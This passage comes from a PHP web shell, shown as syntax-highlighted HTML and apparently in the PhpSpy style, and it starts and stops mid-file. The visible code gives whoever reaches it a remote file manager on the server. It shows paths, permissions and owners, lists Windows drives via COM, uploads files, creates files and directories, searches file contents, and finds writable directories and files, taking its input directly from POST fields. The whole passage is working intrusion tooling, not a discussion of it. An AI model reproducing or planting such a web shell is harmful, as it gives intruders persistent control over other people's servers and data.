underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'%)&lt;/h2&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">cwd_links</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">path</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">'/'</span>, $<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">n</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">count(</span>$<span style="color: #f0c674;">path</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">i</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;$<span style="color: #f0c674;">i</span>&lt;$<span style="color: #f0c674;">n</span>-<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;$<span style="color: #f0c674;">i</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">cwd_links</span> .= <span style="color: #8abeb7;">'&lt;a href="javascript:godir(\''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">j</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;$<span style="color: #f0c674;">j</span>&lt;=$<span style="color: #f0c674;">i</span>;$<span style="color: #f0c674;">j</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">cwd_links</span> .= $<span style="color: #f0c674;">path</span>[$<span style="color: #f0c674;">j</span>].<span style="color: #8abeb7;">'/'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">cwd_links</span> .= <span style="color: #8abeb7;">'\');"&gt;'</span>.$<span style="color: #f0c674;">path</span>[$<span style="color: #f0c674;">i</span>].<span style="color: #8abeb7;">'/&lt;/a&gt;'</span>;
<span style="background-color: #373b41;"> </span>   }

<span style="color: #b294bb;">?&gt;</span>
<span style="color: #81a2be;">&lt;script</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"text/javascript"</span><span style="color: #81a2be;">&gt;</span>
<span style="color: #cc6666; font-weight: bold;">document</span>.<span style="color: #cc6666; font-weight: bold;">onclick</span> = <span style="color: #cc6666; font-weight: bold;">shownav</span>;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">shownav</span>(<span style="color: #cc6666; font-weight: bold;">e</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #cc6666; font-weight: bold;">src</span> = <span style="color: #cc6666; font-weight: bold;">e</span>?<span style="color: #cc6666; font-weight: bold;">e</span>.<span style="color: #cc6666; font-weight: bold;">target</span>:<span style="color: #cc6666; font-weight: bold;">event</span>.<span style="color: #cc6666; font-weight: bold;">srcElement</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">do</span>{
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">src</span>.<span style="color: #cc6666; font-weight: bold;">id</span> ==<span style="color: #8abeb7;">"jumpto"</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'inputnav'</span>).<span style="color: #cc6666; font-weight: bold;">style</span>.<span style="color: #cc6666; font-weight: bold;">display</span> = <span style="color: #8abeb7;">""</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'pathnav'</span>).<span style="color: #cc6666; font-weight: bold;">style</span>.<span style="color: #cc6666; font-weight: bold;">display</span> = <span style="color: #8abeb7;">"none"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">hidenav();</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">src</span>.<span style="color: #cc6666; font-weight: bold;">id</span> ==<span style="color: #8abeb7;">"inputnav"</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">src</span> = <span style="color: #cc6666; font-weight: bold;">src</span>.<span style="color: #cc6666; font-weight: bold;">parentNode</span>;
<span style="background-color: #373b41;"> </span>   }<span style="color: #b5bd68;">while</span>(<span style="color: #cc6666; font-weight: bold;">src</span>.<span style="color: #cc6666; font-weight: bold;">parentNode</span>)

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'inputnav'</span>).<span style="color: #cc6666; font-weight: bold;">style</span>.<span style="color: #cc6666; font-weight: bold;">display</span> = <span style="color: #8abeb7;">"none"</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'pathnav'</span>).<span style="color: #cc6666; font-weight: bold;">style</span>.<span style="color: #cc6666; font-weight: bold;">display</span> = <span style="color: #8abeb7;">""</span>;
}
<span style="color: #81a2be;">&lt;/script&gt;</span>
<span style="color: #81a2be;">&lt;div</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"background:#eee;margin-bottom:10px;"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;table</span> <span style="color: #81a2be;">id=</span><span style="color: #8abeb7;">"pathnav"</span> <span style="color: #81a2be;">width=</span><span style="color: #8abeb7;">"100%"</span> <span style="color: #81a2be;">border=</span><span style="color: #8abeb7;">"0"</span> <span style="color: #81a2be;">cellpadding=</span><span style="color: #8abeb7;">"5"</span> <span style="color: #81a2be;">cellspacing=</span><span style="color: #8abeb7;">"0"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;tr&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td</span> <span style="color: #81a2be;">width=</span><span style="color: #8abeb7;">"100%"</span><span style="color: #81a2be;">&gt;</span><span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">cwd_links</span>.<span style="color: #8abeb7;">' - '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">getChmod(</span>$<span style="color: #f0c674;">nowpath</span>).<span style="color: #8abeb7;">' / </span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">getPerms(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">getUser(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #b294bb; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #f0c674; text-decoration: underline;">dir_writeable</span><span style="text-decoration: underline;">;</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #81a2be; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td</span> <span style="color: #cc6666; font-weight: bold;">nowrap</span><span style="color: #81a2be;">&gt;&lt;input</span> <span style="color: #81a2be;">class=</span><span style="color: #8abeb7;">"bt"</span> <span style="color: #81a2be;">id=</span><span style="color: #8abeb7;">"jumpto"</span> <span style="color: #81a2be;">name=</span><span style="color: #8abeb7;">"jumpto"</span> <span style="color: #81a2be;">value=</span><span style="color: #8abeb7;">"Jump t</span><span style="color: #8abeb7; text-decoration: underline;">o"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">type=</span><span style="color: #8abeb7; text-decoration: underline;">"button"</span><span style="color: #81a2be; text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/tr&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/table&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;table</span> <span style="color: #81a2be;">id=</span><span style="color: #8abeb7;">"inputnav"</span> <span style="color: #81a2be;">width=</span><span style="color: #8abeb7;">"100%"</span> <span style="color: #81a2be;">border=</span><span style="color: #8abeb7;">"0"</span> <span style="color: #81a2be;">cellpadding=</span><span style="color: #8abeb7;">"5"</span> <span style="color: #81a2be;">cellspacing=</span><span style="color: #8abeb7;">"0"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">style=</span><span style="color: #8abeb7; text-decoration: underline;">"display:none;"</span><span style="color: #81a2be; text-decoration: underline;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;form</span> <span style="color: #81a2be;">action=</span><span style="color: #8abeb7;">""</span> <span style="color: #81a2be;">method=</span><span style="color: #8abeb7;">"post"</span> <span style="color: #81a2be;">id=</span><span style="color: #8abeb7;">"godir"</span> <span style="color: #81a2be;">name=</span><span style="color: #8abeb7;">"godir"</span><span style="color: #81a2be;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;tr&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td</span> <span style="color: #cc6666; font-weight: bold;">nowrap</span><span style="color: #81a2be;">&gt;</span><span style="color: #cc6666; font-weight: bold;">Current</span> <span style="color: #c5c8c6; background-color: #1d1f21;">Directory (</span><span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">dir_writeable</span>;<span style="color: #b294bb;">?&gt;</span>, <span style="color: #b294bb;">&lt;?php</span> <span style="color: #b5bd68;">ec</span><span style="color: #b5bd68; text-decoration: underline;">ho</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">getChmod(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #81a2be; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td</span> <span style="color: #81a2be;">width=</span><span style="color: #8abeb7;">"100%"</span><span style="color: #81a2be;">&gt;&lt;input</span> <span style="color: #81a2be;">name=</span><span style="color: #8abeb7;">"view_writable"</span> <span style="color: #81a2be;">value=</span><span style="color: #8abeb7;">"0"</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"hidden"</span><span style="text-decoration: underline;"> /</span><span style="color: #81a2be; text-decoration: underline;">&gt;&lt;input</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">class=</span><span style="color: #8abeb7; text-decoration: underline;">"input"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">name=</span><span style="color: #8abeb7; text-decoration: underline;">"dir"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">value=</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;?php echo $nowpath;?&gt;"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">type=</span><span style="color: #8abeb7; text-decoration: underline;">"text"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">style=</span><span style="color: #8abeb7; text-decoration: underline;">"width:99%;margin:0 8px;"</span><span style="text-decoration: underline;">&gt;</span><span style="color: #81a2be; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;td</span> <span style="color: #cc6666; font-weight: bold;">nowrap</span><span style="color: #81a2be;">&gt;&lt;input</span> <span style="color: #81a2be;">class=</span><span style="color: #8abeb7;">"bt"</span> <span style="color: #81a2be;">value=</span><span style="color: #8abeb7;">"GO"</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"submit"</span><span style="color: #81a2be;">&gt;&lt;/td&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/tr&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/form&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;/table&gt;</span>
<span style="color: #b294bb;">&lt;?php</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">obj</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">COM</span>(<span style="color: #8abeb7;">'scripting.filesystemobject'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">obj</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_object(</span>$<span style="color: #f0c674;">obj</span>) &amp;&amp; $<span style="color: #f0c674;">obj</span>-<span style="color: #81a2be;">&gt;</span><span style="color: #f0c674;">Drives</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;div class="drives"&gt;'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">DriveTypeDB</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(0</span> =&gt; <span style="color: #8abeb7;">'Unknow'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">1</span> =&gt; <span style="color: #8abeb7;">'Removable'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">2</span> =&gt; <span style="color: #8abeb7;">'Fixed'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">3</span> =<span style="text-decoration: underline;">&gt; </span><span style="color: #8abeb7; text-decoration: underline;">'Network'</span><span style="text-decoration: underline;">,</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">4</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #8abeb7; text-decoration: underline;">'CDRom'</span><span style="text-decoration: underline;">,</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">5</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #8abeb7; text-decoration: underline;">'RAM Disk'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">comma</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">obj</span>-&gt;<span style="color: #f0c674;">Drives</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">drive</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">drive</span>-&gt;<span style="color: #f0c674;">Path</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">comma</span>.<span style="color: #8abeb7;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #f0c674;">drive</span>-<span style="color: #81a2be;">&gt;</span><span style="color: #f0c674;">Path</span>.<span style="color: #8abeb7;">'/\');"</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">DriveTypeDB</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">DriveType</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'('</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">Path</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">')&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">comma</span> = <span style="color: #8abeb7;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;/div&gt;'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="color: #b294bb;">?&gt;</span>
<span style="color: #81a2be;">&lt;/div&gt;</span>
<span style="color: #b294bb;">&lt;?php</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">findstr</span> = $<span style="color: #81a2be;">_POST</span>[<span style="color: #8abeb7;">'findstr'</span>];
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">re</span> = $<span style="color: #81a2be;">_POST</span>[<span style="color: #8abeb7;">'re'</span>];
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">tbhead(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div</span><span style="color: #8abeb7; text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>].<span style="color: #8abeb7;">'\');"&gt;WebRoot&lt;/a</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.$<span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'\',\'dir\');"&gt;</span><span style="color: #8abeb7; text-decoration: underline;">Directory&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java</span><span style="color: #8abeb7; text-decoration: underline;">script:createfile(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Create File&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST"&gt;Find s</span><span style="color: #8abeb7; text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">findstr</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="text" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span><span style="text-decoration: underline;">.($</span><span style="color: #f0c674; text-decoration: underline;">re</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'checked'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #8abeb7; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">view_writable</span> == <span style="color: #8abeb7;">'dir'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">GetWDirList(</span>$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">view_writable</span> == <span style="color: #8abeb7;">'file'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">GetWFileList(</span>$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">findstr</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">GetSFileList(</span>$<span style="color: #f0c674;">nowpath</span>, $<span style="color: #f0c674;">findstr</span>, $<span style="color: #f0c674;">re</span>);
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirs</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">opendir(</span>$<span style="color: #f0c674;">dir</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> ($<span style="color: #f0c674;">file</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">readdir(</span>$<span style="color: #f0c674;">dirs</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filepath</span>=$<span style="color: #f0c674;">nowpath</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">file</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(@<span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">filepath</span>)){
